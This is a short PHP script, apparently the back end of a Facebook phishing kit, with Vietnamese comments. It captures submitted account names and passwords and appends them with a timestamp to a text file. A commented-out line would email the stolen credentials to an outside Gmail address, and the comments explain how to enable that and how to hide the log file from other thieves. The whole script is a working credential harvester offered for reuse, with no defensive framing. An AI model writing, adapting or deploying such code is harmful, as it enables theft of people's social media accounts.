<?php 
date_default_timezone_set('Asia/Ho_Chi_Minh');

if(isset($_POST["taikhoan"])){

 $time = date('H:i:s d/m/Y');
    $acc = $_POST["taikhoan"];
    $pass = $_POST["matkhau"];
    $type = $_POST["type"];
     $subject = "Cảm ơn bạn đã sử dụng code!";
     $headers = "Tài khoản facebook";
      $body = "\nTime: ".$time."|acc $type: ".$acc."|pass: ".$pass."\n____________________________________________________________\n";//định dạng acc|pass
    
     // mail("jaxuatt6@gmail.com", $headers, $body); // muốn gửi về mail thì bỏ 2 dấu // phía trước đi rồi thay mail
    $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
    fwrite($test,$body);
    fclose($test);


}

    ?>